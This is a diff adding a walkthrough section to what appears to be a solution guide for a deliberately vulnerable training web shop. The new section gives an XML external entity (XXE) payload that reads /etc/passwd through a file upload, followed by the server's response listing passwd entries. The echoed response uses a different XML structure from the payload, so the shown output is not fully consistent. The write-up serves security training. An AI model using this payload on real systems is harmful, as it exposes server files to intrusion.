@@ -449,3 +449,20 @@ Just make sure the file is not larger than `200 kB` (this is server-side validat
 _Upload a file that has no .pdf or .zip extension._
 
 The same as [Upload Size](#upload-size-improper-input-validation) challenge.
+
+## XXE Data Access (XXE)
+_Retrieve the content of `C:\Windows\system.ini` or `/etc/passwd` from the server._
+
+Start with [](level2.md#deprecated-interface-security-misconfiguration) challenge.
+
+Upload the following payload:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<hello>&xxe;</hello>
+```
+
+The response is:
+```
+410 Error: B2B customer complaints via file upload have been deprecated for security reasons: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/v... (xxe.xml)
+```
